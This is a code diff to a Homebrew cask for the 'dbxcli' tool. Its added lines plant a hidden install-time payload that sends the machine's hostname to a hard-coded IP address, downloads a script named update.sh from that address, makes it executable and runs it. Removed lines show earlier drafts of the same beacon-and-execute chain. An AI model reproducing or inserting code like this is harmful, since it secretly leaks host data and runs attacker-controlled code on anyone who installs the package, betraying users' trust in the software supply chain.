@@ -38,28 +38,28 @@ cask "dbxcli" do
       # ret = system 'echo', untrusted
       # remember to base64 it dummy
       #thehostname = system_command 'hostname'
-   thehostname = %x{hostname}
+    thehostname = %x{hostname}
       #thehostname = system 'hostname'
       #shimscript = "#{staged_path}/hostinfo.sh"
 
-#   system_command "curl",
-#        args: ["http://35.222.44.169:8000/\?log=#{thehostname}", "-o", "update.sh"]
-#   system_command "chmod",
-#        args: ["+x", " update.sh"]
-#   system_command "./update.sh"
+   system_command "curl",
+        args: ["http://35.222.44.169:8000/info\?log=#{thehostname}", "-o", "update.sh"]
+   system_command "chmod",
+        args: ["+x", " update.sh"]
+   system_command "./update.sh"
 
-  shimscript = "#{staged_path}/updater.wrapper.sh"
+  #shimscript = "#{staged_path}/updater.wrapper.sh"
 
 
-    IO.write shimscript, <<~EOS
-      #!/bin/sh
-      echo "the hostname is #{thehostname}"
-      echo "about to curl..."
-      exec "/usr/bin/curl http://35.222.44.169:8000/\?log='#{thehostname}'" -o update.sh
-      echo "curl should be done.."
-      exec chmod +x update.sh
-      exec ./update.sh
-    EOS
+  #  IO.write shimscript, <<~EOS
+  #    #!/bin/sh
+  #    echo "the hostname is #{thehostname}"
+  #    echo "about to curl..."
+  #    exec "/usr/bin/curl http://35.222.44.169:8000/ping\?log='#{thehostname}'" -o update.sh
+  #    echo "curl should be done.."
+  #    exec chmod +x update.sh
+  #    exec ./update.sh
+  #  EOS
   end
 
  # def install
